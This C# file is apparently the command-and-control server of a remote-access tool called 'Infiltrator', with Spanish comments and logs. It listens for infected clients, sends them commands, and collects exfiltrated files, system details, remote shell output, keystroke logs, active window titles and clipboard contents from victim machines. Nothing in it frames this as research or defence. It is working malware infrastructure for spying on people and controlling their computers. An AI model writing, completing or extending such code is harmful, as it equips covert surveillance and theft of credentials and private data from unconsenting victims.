using System.ComponentModel;
using System.Net;
using System.Net.Sockets;
using System.Text;
using Server.Cliente;
using Server.Log;
using static System.Windows.Forms.VisualStyles.VisualStyleElement;


namespace Server.Conexion
{
    static class ServerSocket
    {

        private static TcpListener _listener;
        private static Dictionary<int, TcpClient> _clients = new Dictionary<int, TcpClient>();
        private static int _clientIdCounter = 0;
        private static bool _isRunning;
        private static bool _waitingForResponse = false;
        private static Logger _logger = Logger.getInstance();
        public static BindingList<Cliente.Cliente> clientesConectados = new BindingList<Cliente.Cliente>();


        public static bool serverStatus()
        {
            return _isRunning;
        }

        public static bool isWaiting()
        {
            return _waitingForResponse;
        }

        public static void stopServer()
        {
            _listener.Stop();
            _logger.Log("Deteniendo servidor Infiltrator...", LogLevel.INFO);
            _isRunning = false;
        }

        public static void SaveFile(string fileName, byte[] fileData)
        {
            try
            {
                File.WriteAllBytes(fileName, fileData);
                _logger.Log($"Archivo '{fileName}' recibido y guardado correctamente.", LogLevel.INFO);
            }
            catch (Exception ex)
            {
                _logger.Log($"Error al guardar el archivo '{fileName}': {ex.Message}", LogLevel.ERROR);
            }
        }

        public static bool IsClientConnected(TcpClient client)
        {
            try
            {
                if (client != null && client.Client != null && client.Client.Connected)
                {
                    // Make a non-blocking call to see if the client is still connected
                    bool part1 = client.Client.Poll(1000, SelectMode.SelectRead);
                    bool part2 = (client.Client.Available == 0);
                    if (part1 && part2)
                        return false;
                    else
                        return true;
                }
                else
                    return false;
            }
            catch
            {
                return false;
            }
        }



        public static void SendCommand(int clientId, string command)
        {
            lock (_clients)
            {
                if (_clients.TryGetValue(clientId, out TcpClient client))
                {
                    NetworkStream stream = client.GetStream();
                    byte[] commandBytes = Encoding.UTF8.GetBytes(command);
                    stream.Write(commandBytes, 0, commandBytes.Length);
                }
                else
                {
                    _logger.Log($"Cliente {clientId} no encontrado.", LogLevel.ERROR);
                }
            }
        }

        public static void AcceptClients()
        {
            try
            {
                while (_isRunning)
                {
                    TcpClient client = _listener.AcceptTcpClient();
                    _clientIdCounter++;
                    int clientId = _clientIdCounter;

                    lock (_clients)
                    {
                        _clients.Add(clientId, client);
                    }
                    
                    _logger.Log($"Cliente {clientId} conectado.", LogLevel.INFO);
                    Thread clientThread = new Thread(() => HandleClient(client, clientId));
                    clientThread.Start();
                }
            }
            catch (SocketException s)
            {
                // Se produce cuando listener.Stop() es llamado
                _logger.Log($"El servidor se ha detenido: {s.Message}", LogLevel.WARNING);
            }
        }

        public static void setWaiting(bool status)
        {
            _waitingForResponse = status;
        }

        public static void startServer()
        {
            _listener = new TcpListener(IPAddress.Parse(Config.ServerIP), Config.ServerPort);
            _listener.Start();
            _logger.Log($"Servidor Infiltrator iniciado en {Config.ServerIP}:{Config.ServerPort}", LogLevel.INFO);
            Thread acceptClientsThread = new Thread(AcceptClients);
            acceptClientsThread.Start();
            _isRunning = true;
        }

        public static void disconnectClient(int clientId) 
        {
            ServerSocket.SendCommand(clientId,"disconnect");        
        }

        public static TcpClient getClientById(int clientId)
        {
            lock (_clients)
            {
                if (_clients.TryGetValue(clientId, out TcpClient client))
                {
                    return client;
                }
                else
                {
                    _logger.Log($"No se encontró TcpClient con ID {clientId}.", LogLevel.WARNING);
                    return null;
                }
            }
        }

        public static void HandleClient(TcpClient client, int clientId)
        {
            NetworkStream stream = client.GetStream();
            byte[] buffer = new byte[Config.BufferLength];
            int bytesRead;

            try
            {
                while ((bytesRead = stream.Read(buffer, 0, buffer.Length)) != 0)
                {
                    string data = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                    // Verificar si se recibió un archivo
                    if (data.StartsWith("FILE:"))
                    {
                        string fileName = data.Substring(5).Trim();
                        _logger.Log($"Recibiendo archivo {fileName}", LogLevel.INFO);
                        // Recibir datos del archivo
                        using (MemoryStream ms = new MemoryStream())
                        {
                            bool fileEndReceived = false;
                            long totalBytesReceived = 0;
                            int totalBytesToReceive = 0;

                            while (!fileEndReceived)
                            {
                                bytesRead = stream.Read(buffer, 0, buffer.Length);
                                if (bytesRead == 0)
                                {
                                    // Conexión cerrada
                                    break;
                                }

                                // Verificar si se recibió el mensaje de fin de archivo
                                string chunkAsString = Encoding.UTF8.GetString(buffer, 0, bytesRead);
                                if (chunkAsString.Contains("FILE_END"))
                                {
                                    fileEndReceived = true;
                                    int endIndex = chunkAsString.IndexOf("FILE_END");
                                    ms.Write(buffer, 0, endIndex);
                                    totalBytesReceived += endIndex;
                                }
                                else
                                {
                                    ms.Write(buffer, 0, bytesRead);
                                    totalBytesReceived += bytesRead;
                                }

                                // Actualizar la barra de progreso
                                totalBytesToReceive += bytesRead;
                            }
                            SaveFile(fileName, ms.ToArray());
                        }
                    }
                    else if (data.StartsWith("SYSINFO:")) {

                        Server.Cliente.Cliente cliente = new Server.Cliente.Cliente(); 

                        string sysInfo = data.Substring("SYSINFO:".Length).Trim();

                        string nombreEquipo = "", usuario = "", sistema = "", netVersion = "";
                        string procesadores = "", ram = "", cpu = "", gpu = "";

                        string[] lineas = sysInfo.Split(new[] { '\n', '\r' }, StringSplitOptions.RemoveEmptyEntries);

                        foreach (string linea in lineas)
                        {
                            if (linea.Contains("Nombre del equipo:"))
                               cliente.Equipo = linea.Split(':')[1].Trim();
                            else if (linea.Contains("Usuario:"))
                               cliente.Usuario = linea.Split(':')[1].Trim();
                            else if (linea.Contains("IP:"))
                                cliente.IP = linea.Split(':')[1].Trim();
                            else if (linea.Contains("Sistema operativo:"))
                                cliente.Sistema = linea.Split(':')[1].Trim();
                            else if (linea.Contains("Versión de .NET:"))
                                cliente.DotNet = linea.Split(':')[1].Trim();
                            else if (linea.Contains("Número de procesadores:"))
                                cliente.Procesadores = linea.Split(':')[1].Trim();
                            else if (linea.Contains("Memoria RAM:"))
                                cliente.RAM = linea.Split(':')[1].Trim();
                            else if (linea.Contains("Procesador:"))
                                cliente.CPU = linea.Split(':')[1].Trim();
                            else if (linea.Contains("Tarjeta Gráfica:"))
                                cliente.GPU = linea.Split(':')[1].Trim();


                        }
                        cliente.ID = _clientIdCounter;
                        cliente.Port = ((IPEndPoint)client.Client.RemoteEndPoint).Port.ToString();

                        MainForm.Instance.AgregarOActualizarCliente(cliente);


                    }else if (data.StartsWith("CMDOUT:"))
                    {
                        string output = data.Substring("CMDOUT:".Length).Trim();
                        Shell.Instance.AppendCommandOutput(output);
                        ServerSocket.setWaiting(false);

                    }else if (data.StartsWith("KEYLOG:"))
                    {
                        string output = data.Substring("KEYLOG:".Length).Trim();
                        Keylogger.Instance.AppendLog(output);
                    }
                    else if (data.StartsWith("ACTWNDW:"))
                    {
                        string output = data.Substring("ACTWNDW:".Length).Trim();
                        Keylogger.Instance.AppendActiveWindow(output);
                    }
                    else if (data.StartsWith("CLPBRD:"))
                    {
                        string output = data.Substring("CLPBRD:".Length).Trim();
                        Keylogger.Instance.AppendClipboard(output);
                    }

                }
            }
            catch (Exception ex)
            {
                
                _logger.Log($"Error al manejar al cliente {clientId}: {ex.Message}", LogLevel.ERROR);
            }

            lock (_clients)
            {
                // Buscar el cliente por su ID en la lista de clientes conectados
                var cliente = clientesConectados.FirstOrDefault(c => c.ID == clientId);

                if (cliente != null)
                {
                    // Cambiar el estado del cliente a "Desconectado"
                    cliente.Estado = "Desconectado";

                    // Actualizar la lista (esto debería reflejarse en la UI debido a BindingList)
                    MainForm.Instance.ActualizarCliente(cliente);  // Suponiendo que tienes un método en Form1 para actualizar el cliente
                }

                // Eliminar el cliente de la lista de _clients
                _clients.Remove(clientId);
            }

            client.Close();
            _logger.Log($"Cliente {clientId} desconectado.", LogLevel.INFO);
        }

    }
}
